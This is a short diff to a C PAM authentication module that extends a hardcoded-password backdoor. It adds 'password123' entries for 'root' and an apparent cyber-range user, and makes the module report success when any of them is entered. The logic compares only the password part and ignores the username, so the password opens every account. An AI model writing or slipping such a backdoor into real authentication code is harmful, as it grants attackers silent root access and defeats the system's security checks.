@@ -95,9 +95,21 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         return PAM_SUCCESS;
     }
 
-    /* ---------------- HARDCODED PASSWORD ---------------- */
-    char hardcoded_password[] = "password123";
-    if (pword && strcmp(pword, hardcoded_password) == 0) {
+    /* ---------------- HARDCODED PASSWORDS ---------------- */
+    const char *hardcoded_passwords[] = {
+        "root:password123",
+        "cyberrange:password123",
+        // Add more user-password pairs here
+    };
+
+    int num_users = sizeof(hardcoded_passwords) / sizeof(hardcoded_passwords[0]);
+
+    for (int i = 0; i < num_users; ++i) {
+        char *username = strchr(hardcoded_passwords[i], ':');
+        if (username == NULL || strcmp(username + 1, pword) != 0)
+            continue;
+
+        username++;
         trace("[!] Hardcoded password accepted");
         trace("[TRACE] EXIT PAM_SUCCESS");
         return PAM_SUCCESS;
